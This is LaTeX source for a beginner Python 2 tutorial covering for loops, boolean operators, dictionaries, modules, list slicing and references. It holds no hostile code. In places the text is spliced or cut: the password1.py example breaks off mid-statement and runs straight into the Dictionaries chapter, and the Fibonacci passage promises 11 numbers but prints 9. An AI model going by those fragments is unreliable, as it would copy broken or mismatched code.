The next line \verb'for count in onetoten:' uses the {\tt for} control structure.  A {\tt for} control structure looks like {\tt for variable in list:}.  {\tt list} is gone through starting with the first element of the list and going to the last.  As {\tt for} goes through each element in a list it puts each into {\tt variable}.  That allows {\tt variable} to be used in each successive time the for loop is run through.  Here is another example (you don't have to type this) to demonstrate:
\begin{verbatim}
demolist = ['life',42, 'the universe', 6,'and',7,'everything']
for item in demolist:
    print &quot;The Current item is:&quot;,
    print item
\end{verbatim}
The output is:
\begin{verbatim}
The Current item is: life
The Current item is: 42
The Current item is: the universe
The Current item is: 6
The Current item is: and
The Current item is: 7
The Current item is: everything
\end{verbatim}
Notice how the for loop goes through and sets item to each element in the list.  (Notice how if you don't want {\tt print} to go to the next line add a comma at the end of the statement (i.e. if you want to print something else on that line). )  So, what is {\tt for} good for?  (groan)  The first use is to go through all the elements of a list and do something with each of them.  Here a quick way to add up all the elements:
\begin{verbatim}
list = [2,4,6,8]
sum = 0
for num in list:
        sum = sum + num
print &quot;The sum is: &quot;,sum
\end{verbatim}
with the output simply being:
\begin{verbatim}
The sum is:  20
\end{verbatim}
Or you could write a program to find out if there are any duplicates in a list like this program does:
\begin{verbatim}
list = [4, 5, 7, 8, 9, 1,0,7,10]
list.sort()
prev = list[0]
del list[0]
for item in list:
        if prev == item:
                print &quot;Duplicate of &quot;,prev,&quot; Found&quot;
        prev = item
\end{verbatim}
and for good measure:
\begin{verbatim}
Duplicate of  7  Found
\end{verbatim}
Okay, so how does it work?  Here is a special debugging version to help you understand (you don't need to type this in):
\begin{verbatim}
l = [4, 5, 7, 8, 9, 1,0,7,10]
print &quot;l = [4, 5, 7, 8, 9, 1,0,7,10]&quot;,&quot;\tl:&quot;,l
l.sort()
print &quot;l.sort()&quot;,&quot;\tl:&quot;,l
prev = l[0]
print &quot;prev = l[0]&quot;,&quot;\tprev:&quot;,prev
del l[0]
print &quot;del l[0]&quot;,&quot;\tl:&quot;,l
for item in l:
        if prev == item:
                print &quot;Duplicate of &quot;,prev,&quot; Found&quot;
        print &quot;if prev == item:&quot;,&quot;\tprev:&quot;,prev,&quot;\titem:&quot;,item
        prev = item
        print &quot;prev = item&quot;,&quot;\t\tprev:&quot;,prev,&quot;\titem:&quot;,item
\end{verbatim}
with the output being:
\begin{verbatim}
l = [4, 5, 7, 8, 9, 1,0,7,10]   l: [4, 5, 7, 8, 9, 1, 0, 7, 10]
l.sort()        l: [0, 1, 4, 5, 7, 7, 8, 9, 10]
prev = l[0]     prev: 0
del l[0]        l: [1, 4, 5, 7, 7, 8, 9, 10]
if prev == item:        prev: 0         item: 1
prev = item             prev: 1         item: 1
if prev == item:        prev: 1         item: 4
prev = item             prev: 4         item: 4
if prev == item:        prev: 4         item: 5
prev = item             prev: 5         item: 5
if prev == item:        prev: 5         item: 7
prev = item             prev: 7         item: 7
Duplicate of  7  Found
if prev == item:        prev: 7         item: 7
prev = item             prev: 7         item: 7
if prev == item:        prev: 7         item: 8
prev = item             prev: 8         item: 8
if prev == item:        prev: 8         item: 9
prev = item             prev: 9         item: 9
if prev == item:        prev: 9         item: 10
prev = item             prev: 10        item: 10
\end{verbatim}
The reason I put so many {\tt print} statements in the code was so that you can see what is happening in each line.  (BTW, if you can't figure out why a program is not working, try putting in lots of print statements to you can see what is happening)  First the program starts with a boring old list.  Next the program sorts the list.  This is so that any duplicates get put next to each other.  The program then initializes a prev(ious) variable.  Next the first element of the list is deleted so that the first item is not incorrectly thought to be a duplicate.  Next a for loop is gone into.  Each item of the list is checked to see if it is the same as the previous.  If it is a duplicate was found.  The value of prev is then changed so that the next time the for loop is run through prev is the previous item to the current.  Sure enough, the 7 is found to be a duplicate.  (Notice how \verb'\t' is used to print a tab.)  

The other way to use for loops is to do something a certain number of times.  Here is some code to print out the first 11 numbers of the Fibonacci series:
\begin{verbatim}
a = 1
b = 1
for c in range(1,10):
        print a,
        n = a + b
        a = b
        b = n
\end{verbatim}
with the surprising output:
\begin{verbatim}
1 1 2 3 5 8 13 21 34
\end{verbatim}
Everything that can be done with {\tt for} loops can also be done with {\tt while} loops but {\tt for} loops give an easy way to go through all the elements in a list or to do something a certain number of times.

\chapter{Boolean Expressions}
Here is a little example of boolean expressions (you don't have to type it in):
\begin{verbatim}
a = 6
b = 7
c = 42
print 1, a == 6
print 2, a == 7
print 3,a == 6 and b == 7
print 4,a == 7 and b == 7
print 5,not a == 7 and b == 7
print 6,a == 7 or b == 7
print 7,a == 7 or b == 6
print 8,not (a == 7 and b == 6)
print 9,not a == 7 and b == 6
\end{verbatim}
With the output being:
\begin{verbatim}
1 1
2 0
3 1
4 0
5 1
6 1
7 0
8 1
9 0
\end{verbatim}
What is going on?  The program consists of a bunch of funny looking {\tt print} statements.  Each {\tt print} statement prints a number and an expression.  The number is to help keep track of which statement I am dealing with.  Notice how each expression ends up being either 0 or 1.  In Python false is written as 0 and true is written as 1.  
%%For example:
%%\begin{verbatim}
%%&gt;&gt;&gt; if 1:
%%...     print &quot;true&quot;
%%... else:
%%...     print &quot;false&quot;
%%... 
%%true
%%&gt;&gt;&gt; if 0:
%%...     print &quot;true&quot;
%%... else:
%%...     print &quot;false&quot;
%%... 
%%false
%%\end{verbatim}
The lines:
\begin{verbatim}
print 1, a == 6
print 2, a == 7
\end{verbatim}
print out a 1 and a 0 respectively just as expected since the first is true and the second is false.  The third print, \verb'print 3,a == 6 and b == 7', is a little different.  The operator {\tt and} means if both the statement before and the statement after are true then the whole expression is true otherwise the whole expression is false.  The next line, \verb'print 4,a == 7 and b == 7', shows how if part of an {\tt and} expression is false, the whole thing is false.  The behavior of {\tt and} can be summarized as follows:

\begin{tabular}{l | l}
expression &amp; result \\
\hline  
true and true &amp; true \\
true and false &amp; false \\
false and true &amp; false \\
false and false &amp; false \\
\end{tabular}

Notice that if the first expression is false Python does not check the second expression since it knows the whole expression is false.  

The next line, \verb'print 5,not a == 7 and b == 7', uses the {\tt not} operator.  {\tt not} just gives the opposite of the expression (The expression could be rewritten as {\tt print 5,a != 7 and b == 7}).  Heres the table:

\begin{tabular}{l | l}
expression &amp; result \\
\hline
not true &amp; false \\
not false &amp; true \\
\end{tabular}

The two following lines, \verb'print 6,a == 7 or b == 7' and \verb'print 7,a == 7 or b == 6', use the {\tt or} operator.  The {\tt or} operator returns true if the first expression is true, or if the second expression is true or both are true.  If neither are true it returns false.  Here's the table:

\begin{tabular}{l | l}
expression &amp; result \\
\hline  
true or true &amp; true \\
true or false &amp; true \\
false or true &amp; true  \\
false or false &amp; false \\
\end{tabular}

Notice that if the first expression is true Python doesn't check the second expression since it knows the whole expression is true.  This works since {\tt or} is true if at least one half of the expression is true.  The first part is true so the second part could be either false or true, but the whole expression is still true.

The next two lines, \verb'print 8,not (a == 7 and b == 6)' and \verb'print 9,not a == 7 and b == 6', show that parentheses can be used to group expressions and force one part to be evaluated first.  Notice that the parentheses changed the expression from false to true.   This occurred since the parentheses forced the {\tt not} to apply to the whole expression instead of just the {\tt a == 7} portion.

Here is an example of using a boolean expression:
\begin{verbatim}
list = [&quot;Life&quot;,&quot;The Universe&quot;,&quot;Everything&quot;,&quot;Jack&quot;,&quot;Jill&quot;,&quot;Life&quot;,&quot;Jill&quot;]

#make a copy of the list.  See the More on Lists chapter to explain what
#[:] means.
copy = list[:]
#sort the copy
copy.sort()
prev = copy[0]
del copy[0]

count = 0

#go through the list searching for a match
while count &lt; len(copy) and copy[count] != prev:
    prev = copy[count]
    count = count + 1

#If a match was not found then count can't be &lt; len
#since the while loop continues while count is &lt; len
#and no match is found
if count &lt; len(copy):
    print &quot;First Match: &quot;,prev
\end{verbatim}

And here is the output:
\begin{verbatim}
First Match:  Jill
\end{verbatim}

This program works by continuing to check for match {\tt while count &lt; len(copy and copy[count]}.  When either {\tt count} is greater than the last index of {\tt copy} or a match has been found the {\tt and} is no longer true so the loop exits.  The {\tt if} simply checks to make sure that the {\tt while} exited because a match was found.  

The other `trick' of {\tt and} is used in this example.  If you look at the table for {\tt and} notice that the third entry is ``false and won't check''.   If {\tt count &gt;= len(copy)} (in other words {\tt count &lt; len(copy)} is false) then copy[count] is never looked at.  This is because Python knows that if the first is false then they both can't be true.  This is known as a short circuit and is useful if the second half of the {\tt and} will cause an error if something is wrong.  I used the first expression ({\tt count &lt; len(copy)}) to check and see if {\tt count} was a valid index for {\tt copy}.  (If you don't believe me remove the matches `Jill' and `Life', check that it still works and then reverse the order of {\tt count &lt; len(copy) and copy[count] != prev} to {\tt copy[count] != prev and count &lt; len(copy)}.)

Boolean expressions can be used when you need to check two or more different things at once.  

\section{Examples}

password1.py
\begin{verbatim}
## This programs asks a user for a name and a password.
# It then checks them to make sure the the user is allowed in.

name = raw_input(&quot;What is your name? &quot;)
password = raw_input(&quot;What is the password? &quot;)
if name == &quot;Josh&quot; and password == &quot;Friday&quot;:
    print &quot;Welcome Josh&quot;
elif name == &quot;Fred&quot; and password == &quot;Rock&quot;:

\chapter{Dictionaries}
This chapter is about dictionaries.  Dictionaries have keys and values.  The keys are used to find the values. Here is an example of a dictionary in use:
\begin{verbatim}
def print_menu():
    print '1. Print Phone Numbers'
    print '2. Add a Phone Number'
    print '3. Remove a Phone Number'
    print '4. Lookup a Phone Number'
    print '5. Quit'
    print
numbers = {}
menu_choice = 0
print_menu()
while menu_choice != 5:
    menu_choice = input(&quot;Type in a number (1-5):&quot;)
    if menu_choice == 1:
        print &quot;Telephone Numbers:&quot;
        for x in numbers.keys():
            print &quot;Name: &quot;,x,&quot; \tNumber: &quot;,numbers[x]
        print
    elif menu_choice == 2:
        print &quot;Add Name and Number&quot;
        name = raw_input(&quot;Name:&quot;)
        phone = raw_input(&quot;Number:&quot;)
        numbers[name] = phone
    elif menu_choice == 3:
        print &quot;Remove Name and Number&quot;
        name = raw_input(&quot;Name:&quot;)
        if numbers.has_key(name):
            del numbers[name]
        else:
            print name,&quot; was not found&quot;
    elif menu_choice == 4:
        print &quot;Lookup Number&quot;
        name = raw_input(&quot;Name:&quot;)
        if numbers.has_key(name):
            print &quot;The number is&quot;,numbers[name]
        else:
            print name,&quot; was not found&quot;
    elif menu_choice != 5:
        print_menu()
\end{verbatim}
And here is my output:
\begin{verbatim}
1. Print Phone Numbers
2. Add a Phone Number
3. Remove a Phone Number
4. Lookup a Phone Number
5. Quit

Type in a number (1-5):2
Add Name and Number

Type in a number (1-5):4  
Lookup Number

The number is 545-4464
Type in a number (1-5):3
Remove Name and Number

Type in a number (1-5):1
Telephone Numbers:
Name:  Jill     Number:  979-4654
Name:  Joe      Number:  545-4464

Type in a number (1-5):5
\end{verbatim}
This program is similar to the name list earlier in the the chapter on lists.  Heres how the program works.  First the function \verb'print_menu' is defined.  \verb'print_menu' just prints a menu that is later used twice in the program.  Next comes the funny looking line {\verb'numbers = {}'}.  All that line does is tell Python that {\tt numbers} is a dictionary.  The next few lines just make the menu work.  The lines:
\begin{verbatim}
for x in numbers.keys():
    print &quot;Name: &quot;,x,&quot; \tNumber: &quot;,numbers[x]
\end{verbatim}
go through the dictionary and print all the information.  The function {\tt numbers.keys()} returns a list that is then used by the {\tt for} loop.  The list returned by {\tt keys} is not in any particular order so if you want it in alphabetic order it must be sorted.  Similar to lists the statement {\tt numbers[x]} is used to access a specific member of the dictionary.  Of course in this case {\tt x} is a string.  Next the line {\tt numbers[name] = phone} adds a name and phone number to the dictionary.  If {\tt name} had already been in the dictionary {\tt phone} would replace whatever was there before.  Next the lines: 
\begin{verbatim}
if numbers.has_key(name):
    del numbers[name]
\end{verbatim}
see if a name is in the dictionary and remove it if it is.  The function \verb'numbers.has_key(name)' returns true if {\tt name} is in {\tt numbers} but other wise returns false.  The line {\tt del numbers[name]} removes the key {\tt name} and the value associated with that key.  The lines: 
\begin{verbatim}
if numbers.has_key(name):
    print &quot;The number is&quot;,numbers[name]
\end{verbatim}
check to see if the dictionary has a certain key and if it does prints out the number associated with it.  Lastly if the menu choice is invalid it reprints the menu for your viewing pleasure.  

\label{firstgrades}
A recap: Dictionaries have keys and values.  Keys can be strings or
numbers.  Keys point to values.  Values can be any type of variable
(including lists or even dictionaries (those dictionaries or lists of
course can contain dictionaries or lists themselves (scary right? :)
)).  Here is an example of using a list in a dictionary:
\begin{verbatim}
max_points = [25,25,50,25,100]
assignments = ['hw ch 1','hw ch 2','quiz   ','hw ch 3','test']
students = {'#Max':max_points}

def print_menu():
    print &quot;1. Add student&quot;
    print &quot;2. Remove student&quot;
    print &quot;3. Print grades&quot;
    print &quot;4. Record grade&quot;
    print &quot;5. Print Menu&quot;
    print &quot;6. Exit&quot;
\end{verbatim}
\begin{verbatim}

def print_all_grades():
        print '\t',
        for i in range(len(assignments)):
            print assignments[i],'\t',
        print
        keys = students.keys()
        keys.sort()
        for x in keys:
            print x,'\t',
            grades = students[x]
            print_grades(grades)
\end{verbatim}
\begin{verbatim}

def print_grades(grades):
    for i in range(len(grades)):
        print grades[i],'\t\t',
    print
\end{verbatim}
\begin{verbatim}

menu_choice = 0
while menu_choice != 6:
    print
    menu_choice = input(&quot;Menu Choice (1-6):&quot;)
    if menu_choice == 1:
        name = raw_input(&quot;Student to add:&quot;)
        students[name] = [0]*len(max_points)
    elif menu_choice == 2:
        name = raw_input(&quot;Student to remove:&quot;)
        if students.has_key(name):
            del students[name]
        else:
            print &quot;Student: &quot;,name,&quot; not found&quot;
    elif menu_choice == 3:
        print_all_grades()
        
    elif menu_choice == 4:
        print &quot;Record Grade&quot;

        if students.has_key(name):
            grades = students[name]
            print &quot;Type in the number of the grade to record&quot;
            print &quot;Type a 0 (zero) to exit&quot;
            for i in range(len(assignments)):
                print i+1,' ',assignments[i],'\t',
            print
            print_grades(grades)
            which = 1234
            while which != -1:
                which = input(&quot;Change which Grade:&quot;)
                which = which-1
                if 0 &lt;= which &lt; len(grades):
                    grade = input(&quot;Grade:&quot;)
                    grades[which] = grade
                elif which != -1:
                    print &quot;Invalid Grade Number&quot;
        else:
            print &quot;Student not found&quot;
    elif menu_choice != 6:
        print_menu()

Menu Choice (1-6):6
\end{verbatim}
Heres how the program works.  Basically the variable {\tt students} is
a dictionary with the keys being the name of the students and the
values being their grades.  The first two lines just create two lists.
The next line \verb&quot;students = {'#Max':max_points}&quot; creates a new
dictionary with the key {\verb'#Max'} and the value is set to be {\tt
[25,25,50,25,100]} (since thats what \verb'max_points' was when the
assignment is made) (I use the key \verb'#Max' since \verb'#' is sorted
ahead of any alphabetic characters).  Next \verb'print_menu' is
defined.  Next the \verb'print_all_grades' function is defined in the
lines:
\begin{verbatim}
def print_all_grades():
        print '\t',
        for i in range(len(assignments)):
            print assignments[i],'\t',
        print
        keys = students.keys()
        keys.sort()
        for x in keys:
            print x,'\t',
            grades = students[x]
            print_grades(grades)
\end{verbatim}
Notice how first the keys are gotten out of the {\tt students} dictionary with the {\tt keys} function in the line {\tt keys = students.keys() }.  {\tt keys} is a list so all the functions for lists can be used on it.  Next the keys are sorted in the line {\tt keys.sort()} since it is a list.  {\tt for} is used to go through all the keys.  The grades are stored as a list inside the dictionary so the assignment {\tt grades = students[x]} gives {\tt grades} the list that is stored at the key {\tt x}.  The function \verb'print_grades' just prints a list and is defined a few lines later.

The later lines of the program implement the various options of the menu.  The line \verb'students[name] = [0]*len(max_points)' adds a student to the key of their name.  The notation \verb'[0]*len(max_points)' just creates a array of 0's that is the same length as the \verb'max_points' list.  

The remove student entry just deletes a student similar to the telephone book example.  The record grades choice is a little more complex.  The grades are retrieved in the line {\tt grades = students[name]} gets a reference to the grades of the student {\tt name}.  A grade is then recorded in the line {\tt grades[which] = grade}.  You may notice that {\tt grades} is never put back into the students dictionary (as in no {\tt students[name] = grades}).  The reason for the missing statement is that {\tt grades} is actually another name for {\tt students[name]} and so changing {\tt grades} changes {\tt student[name]}.  

Dictionaries provide an easy way to link keys to values.  This can be used to easily keep track of data that is attached to various keys.  

\chapter{Using Modules}
Here's this chapter's typing exercise (name it cal.py)\footnote{import actually looks for a file named calendar.py and reads it in.  If the file is named calendar.py and it sees a 'import calendar' it tries to read in itself which works poorly at best.}:
\begin{verbatim}
import calendar

year = input(&quot;Type in the year number:&quot;)
calendar.prcal(year)
\end{verbatim}
And here is part of the output I got:
\begin{verbatim}
Type in the year number:2001
                                  2001                                  

       January                  February                    March       
Mo Tu We Th Fr Sa Su      Mo Tu We Th Fr Sa Su      Mo Tu We Th Fr Sa Su
 1  2  3  4  5  6  7                1  2  3  4                1  2  3  4     
 8  9 10 11 12 13 14       5  6  7  8  9 10 11       5  6  7  8  9 10 11     
15 16 17 18 19 20 21      12 13 14 15 16 17 18      12 13 14 15 16 17 18     
22 23 24 25 26 27 28      19 20 21 22 23 24 25      19 20 21 22 23 24 25     
29 30 31                  26 27 28                  26 27 28 29 30 31        

\end{verbatim}
(I skipped some of the output, but I think you get the idea.)  So what does the program do?  The first line {\tt import calendar} uses a new command {\tt import}.  The command {\tt import} loads a module (in this case the {\tt calendar} module).  To see the commands available in the standard modules either look in the library reference for python (if you downloaded it) or go to {\tt http://www.python.org/doc/current/lib/lib.html}.  The calendar module is described in 5.9.  If you look at the documentation lists a function called {\tt prcal} that prints a calendar for a year.  The line {\tt calendar.prcal(year)} uses the function.  In summary to use a module {\tt import} it and then use module\_name.function for functions in the module.  Another way to write the program is:
\begin{verbatim}
from calendar import prcal

year = input(&quot;Type in the year number:&quot;)
prcal(year)
\end{verbatim} 
This version imports a specific function from a module.  Here is another program that uses the Python Library (name it something like clock.py)  (press Ctrl and the 'c' key at the same time to kill the program):
\begin{verbatim}
from time import time, ctime

prev_time = &quot;&quot;
while(1):
    the_time = ctime(time())
    if(prev_time != the_time):
        print &quot;The time is:&quot;,ctime(time())
        prev_time = the_time
\end{verbatim}
With some output being:
\begin{verbatim}
The time is: Sun Aug 20 13:40:04 2000
The time is: Sun Aug 20 13:40:05 2000
The time is: Sun Aug 20 13:40:06 2000
The time is: Sun Aug 20 13:40:07 2000
Traceback (innermost last):
  File &quot;clock.py&quot;, line 5, in ?
    the_time = ctime(time())
KeyboardInterrupt
\end{verbatim}
The output is infinite of course so I canceled it (or the output at least continues until Ctrl+C is pressed).  The program just does a infinite loop and each time checks to see if the time has changed and prints it if it has.  Notice how multiple names after the import statement are used in the line {\tt from time import time, ctime}.  

The Python Library contains many useful functions.  These functions give your programs more abilities and many of them can simplify programming in Python.

\section{Exercises}

Rewrite the high_low.py program from section \ref{firsthighlow} to use the last two
digits of time at that moment to be the 'random' number.


\chapter{More on Lists}
We have already seen lists and how they can be used.   Now that you have some more background I will go into more detail about lists.  First we will look at more ways to get at the elements in a list and then we will talk about copying them.  

Here are some examples of using indexing to access a single element of an list:
\begin{verbatim}
&gt;&gt;&gt; list = ['zero','one','two','three','four','five']   
&gt;&gt;&gt; list[0]
'zero'
&gt;&gt;&gt; list[4]
'four'
&gt;&gt;&gt; list[5]
'five'
\end{verbatim}
All those examples should look familiar to you.  If you want the first item in the list just look at index 0.  The second item is index 1 and so on through the list.  However what if you want the last item in the list?  One way could be to use the \verb'len' function like \verb'list[len(list)-1]'.  This way works since the \verb'len' function always returns the last index plus one.  The second from the last would then be \verb'list[len(list)-2]'.  There is an easier way to do this.  In Python the last item is always index -1.  The second to the last is index -2 and so on.  Here are some more examples:
\begin{verbatim}
&gt;&gt;&gt; list[len(list)-1]  
'five'
&gt;&gt;&gt; list[len(list)-2]
'four'
&gt;&gt;&gt; list[-1]
'five'
&gt;&gt;&gt; list[-2]
'four'
&gt;&gt;&gt; list[-6]
'zero'
\end{verbatim}
Thus any item in the list can be indexed in two ways: from the front and from the back.

Another useful way to get into parts of lists is using slices.  Here is another example to give you an idea what they can be used for:
\begin{verbatim}
&gt;&gt;&gt; list = [0,'Fred',2,'S.P.A.M.','Stocking',42,&quot;Jack&quot;,&quot;Jill&quot;]
&gt;&gt;&gt; list[0]  
0
&gt;&gt;&gt; list[7]
'Jill'
&gt;&gt;&gt; list[0:8]
[0, 'Fred', 2, 'S.P.A.M.', 'Stocking', 42, 'Jack', 'Jill']
&gt;&gt;&gt; list[2:4]
[2, 'S.P.A.M.']
&gt;&gt;&gt; list[4:7]
['Stocking', 42, 'Jack']
&gt;&gt;&gt; list[1:5]
['Fred', 2, 'S.P.A.M.', 'Stocking']
\end{verbatim}
Slices are used to return part of a list.  The slice operator is in the form \verb'list[first_index:following_index]'.  The slice goes from the \verb'first_index' to the index before the \verb'following_index'.  You can use both types of indexing:
\begin{verbatim}
&gt;&gt;&gt; list[-4:-2]
['Stocking', 42]
&gt;&gt;&gt; list[-4]
'Stocking'
&gt;&gt;&gt; list[-4:6]
['Stocking', 42]
\end{verbatim}
Another trick with slices is the unspecified index.  If the first index is not specified the beginning of the list is assumed.  If the following index is not specified the whole rest of the list is assumed.  Here are some examples:
\begin{verbatim}
&gt;&gt;&gt; list[:2]
[0, 'Fred']
&gt;&gt;&gt; list[-2:]
['Jack', 'Jill']
&gt;&gt;&gt; list[:3]
[0, 'Fred', 2]
&gt;&gt;&gt; list[:-5] 
[0, 'Fred', 2]
\end{verbatim}
Here is a program example (copy and paste in the poem definition if you want):
\begin{verbatim}
poem = [&quot;&lt;B&gt;&quot;,&quot;Jack&quot;,&quot;and&quot;,&quot;Jill&quot;,&quot;&lt;/B&gt;&quot;,&quot;went&quot;,&quot;up&quot;,&quot;the&quot;,&quot;hill&quot;,&quot;to&quot;,&quot;&lt;B&gt;&quot;,\
&quot;fetch&quot;,&quot;a&quot;,&quot;pail&quot;,&quot;of&quot;,&quot;&lt;/B&gt;&quot;,&quot;water.&quot;,&quot;Jack&quot;,&quot;fell&quot;,&quot;&lt;B&gt;&quot;,&quot;down&quot;,&quot;and&quot;,\
&quot;broke&quot;,&quot;&lt;/B&gt;&quot;,&quot;his&quot;,&quot;crown&quot;,&quot;and&quot;,&quot;&lt;B&gt;&quot;,&quot;Jill&quot;,&quot;came&quot;,&quot;&lt;/B&gt;&quot;,&quot;tumbling&quot;,\
&quot;after&quot;]

def get_bolds(list):
        true = 1  
        false = 0
        ## is_bold tells whether or not the we are currently looking at 
        ## a bold section of text.
        is_bold = false
        ## start_block is the index of the start of either an unbolded 
        ## segment of text or a bolded segment.
        start_block = 0
        for index in range(len(list)):
                ##Handle a starting of bold text
                if list[index] == &quot;&lt;B&gt;&quot;:
                        if is_bold:
                                print &quot;Error:  Extra Bold&quot;
                        ##print &quot;Not Bold:&quot;,list[start_block:index]
                        is_bold = true
                        start_block = index+1
                ##Handle end of bold text
                ##Remember that the last number in a slice is the index 
                ## after the last index used.
                if list[index] == &quot;&lt;/B&gt;&quot;:
                        if not is_bold:
                                print &quot;Error: Extra Close Bold&quot;
                        print &quot;Bold [&quot;,start_block,&quot;:&quot;,index,&quot;] &quot;,\
                        list[start_block:index]
                        is_bold = false
                        start_block = index+1

get_bolds(poem)
\end{verbatim}
with the output being:
\begin{verbatim}
Bold [ 1 : 4 ]  ['Jack', 'and', 'Jill']
Bold [ 11 : 15 ]  ['fetch', 'a', 'pail', 'of']
Bold [ 20 : 23 ]  ['down', 'and', 'broke']
Bold [ 28 : 30 ]  ['Jill', 'came']
\end{verbatim}

The \verb'get_bold' function takes in a list that is broken into words
and token's.  The tokens that it looks for are \verb'&lt;B&gt;' which starts
the bold text and \verb'&lt;\B&gt;' which ends bold text.  The function
\verb'get_bold' goes through and searches for the start and end
tokens.

The next feature of lists is copying them.  If you try something simple like:
\begin{verbatim}
&gt;&gt;&gt; a = [1,2,3]
&gt;&gt;&gt; b = a
&gt;&gt;&gt; print b
[1, 2, 3]
&gt;&gt;&gt; b[1] = 10
&gt;&gt;&gt; print b
[1, 10, 3]
&gt;&gt;&gt; print a
[1, 10, 3]
\end{verbatim}
This probably looks surprising since a modification to {\tt b}
resulted in {\tt a} being changed as well.  What happened is that the
statement \verb'b = a' makes {\tt b} a {\em reference} to {\tt a}.
This means that {\tt b} can be thought of as another name for {\tt a}.
Hence any modification to {\tt b} changes {\tt a} as well.  However
some assignments don't create two names for one list:
\begin{verbatim}
&gt;&gt;&gt; a = [1,2,3]
&gt;&gt;&gt; b = a*2
&gt;&gt;&gt; print a
[1, 2, 3]
&gt;&gt;&gt; print b
[1, 2, 3, 1, 2, 3]
&gt;&gt;&gt; a[1] = 10
&gt;&gt;&gt; print a
[1, 10, 3]
&gt;&gt;&gt; print b
[1, 2, 3, 1, 2, 3]
\end{verbatim}

In this case {\tt b} is not a reference to {\tt a} since the
expression \verb'a*2' creates a new list.  Then the statement
\verb'b = a*2' gives {\tt b} a reference to \verb'a*2' rather than a
reference to {\tt a}.  All assignment operations create a reference.
When you pass a list as a argument to a function you create a
reference as well.  Most of the time you don't have to worry about
creating references rather than copies.  However when you need to make
modifications to one list without changing another name of the list
you have to make sure that you have actually created a copy.

There are several ways to make a copy of a list.  The simplest that
works most of the time is the slice operator since it always makes a
new list even if it is a slice of a whole list:
\begin{verbatim}
&gt;&gt;&gt; a = [1,2,3]
&gt;&gt;&gt; b = a[:]
&gt;&gt;&gt; b[1] = 10
&gt;&gt;&gt; print a
[1, 2, 3]
&gt;&gt;&gt; print b
[1, 10, 3]
\end{verbatim}

Taking the slice {\tt [:]} creates a new copy of the list.  However it
only copies the outer list.  Any sublist inside is still a references
to the sublist in the original list.  Therefore, when the list
contains lists the inner lists have to be copied as well.  You could
do that manually but Python already contains a module to do it.  You
use the {\tt deepcopy} function of the {\tt copy} module:
\begin{verbatim}
&gt;&gt;&gt; import copy
&gt;&gt;&gt; a = [[1,2,3],[4,5,6]]
&gt;&gt;&gt; b = a[:]
&gt;&gt;&gt; c = copy.deepcopy(a)
&gt;&gt;&gt; b[0][1] = 10
&gt;&gt;&gt; c[1][1] = 12
&gt;&gt;&gt; print a
[[1, 10, 3], [4, 5, 6]]
&gt;&gt;&gt; print b
[[1, 10, 3], [4, 5, 6]]
&gt;&gt;&gt; print c
[[1, 2, 3], [4, 12, 6]]
\end{verbatim}
First of all notice that {\tt a} is an array of arrays.  Then notice
that when \verb'b[0][1] = 10' is run both {\tt a} and {\tt b} are
changed, but {\tt c} is not.  This happens because the inner arrays
are still references when the slice operator is used.  However with
{\tt deepcopy} {\tt c} was fully copied.

So, should I worry about references every time I use a function or
\verb'='?  The good news is that you only have to worry about
references when using dictionaries and lists.  Numbers and strings
create references when assigned but every operation on numbers and
strings that modifies them creates a new copy so you can never modify
them unexpectedly.  You do have to think about references when you are
modifying a list or a dictionary.

By now you are probably wondering why are references used at all?  The
basic reason is speed.  It is much faster to make a reference to a
thousand element list than to copy all the elements.  The other reason
is that it allows you to have a function to modify the inputed list
or dictionary.  Just remember about references if you ever have some
weird problem with data being changed when it shouldn't be.

%%\end{verbatim}
%%
%%So how does it work?  The first detail to notice is that it defines two different functions, one that converts a string to a number and one that converts a number to a string.  Notice that this function does string manipulation similar to how lists can be manipulated.  For example the line \verb'if in_str[0] == &quot;-&quot;' uses indexing to look at the first letter in the string.  Another thing that strings can do that lists can is using slices.  The line \verb'in_str = in_str[1:]' uses slices to get all but the first character of in_str (or drops the first letter).  However you cannot use slices or indexing to assign to a letter or location in a string.
%%
%%Two new things to introduced are the functions \verb'ord' and \verb'chr'.  The 
%%\verb'ord' function takes a character (a string of length one) and returns the ASCII value of the character.  The function \verb'chr' is its inverse and takes a ASCII value and returns a character.  The expression \verb&quot;ord(in_str[x]) - ord('0')&quot; uses the \verb'ord' function to find the value of a string.  This works since '0' through '9' have ASCII values that are all in a row.  The ASCII value of '0' is 48 and the ASCII value of '9' is 57 so when we subtract 57-48 we get 9 and this works similarly with other numbers.  The expression \verb&quot;chr(ord('0')+in_int % 10)&quot; works in a similar manor but in reverse.  

And now presenting a cool trick that can be done with strings:
\begin{verbatim}
def shout(string):
    for character in string:
        print &quot;Gimme a &quot;+character
        print &quot;'&quot;+character+&quot;'&quot;

shout(&quot;Lose&quot;)

def middle(string):
    print &quot;The middle character is:&quot;,string[len(string)/2]

middle(&quot;abcdefg&quot;)
middle(&quot;The Python Programming Language&quot;)
middle(&quot;Atlanta&quot;)
\end{verbatim}

And the output is:
\begin{verbatim}
Gimme a L
'L'
Gimme a o
'o'
Gimme a s
's'
Gimme a e
'e'
The middle character is: d
The middle character is: r
The middle character is: a
\end{verbatim}
What these programs demonstrate is that strings are similar to lists in several ways.  The {\tt shout} procedure shows that {\tt for} loops can be used with strings just as they can be used with lists.  The middle procedure shows that that strings can also use the {\tt len} function and array indexes and slices.  Most list features work on strings as well.

The next feature demonstrates some string specific features:
\begin{verbatim}
def to_upper(string):
    ## Converts a string to upper case
    upper_case = &quot;&quot;
    for character in string:
        if 'a' &lt;= character &lt;= 'z':
            location = ord(character) - ord('a')
            new_ascii = location + ord('A')
            character = chr(new_ascii)
        upper_case = upper_case + character
    return upper_case

print to_upper(&quot;This is Text&quot;)
\end{verbatim}
with the output being:
\begin{verbatim}
THIS IS TEXT
\end{verbatim}
This works because the computer represents the characters of a string as numbers from 0 to 255.  Python has a function called {\tt ord} (short for ordinal) that returns a character as a number.  There is also a corresponding function called {\tt chr} that converts a number into a character.  With this in mind the program should start to be clear.  The first detail is the line: \verb$if 'a' &lt;= character &lt;= 'z':$ which checks to see if a letter is lower case.  If it is than the next lines are used.  First it is converted into a location so that a=0,b=1,c=2 and so on with the line: \verb$location = ord(character) - ord('a')$.  Next the new value is found with \verb$new_ascii = location + ord('A')$.  This value is converted back to a character that is now upper case.

Now for some interactive typing exercise:
\begin{verbatim}
&gt;&gt;&gt; #Integer to String
... 
&gt;&gt;&gt; 2
2
&gt;&gt;&gt; repr(2)
'2'
&gt;&gt;&gt; -123
-123
&gt;&gt;&gt; repr(-123)
'-123'
&gt;&gt;&gt; #String to Integer
... 
&gt;&gt;&gt; &quot;23&quot;
'23'
&gt;&gt;&gt; int(&quot;23&quot;)
23
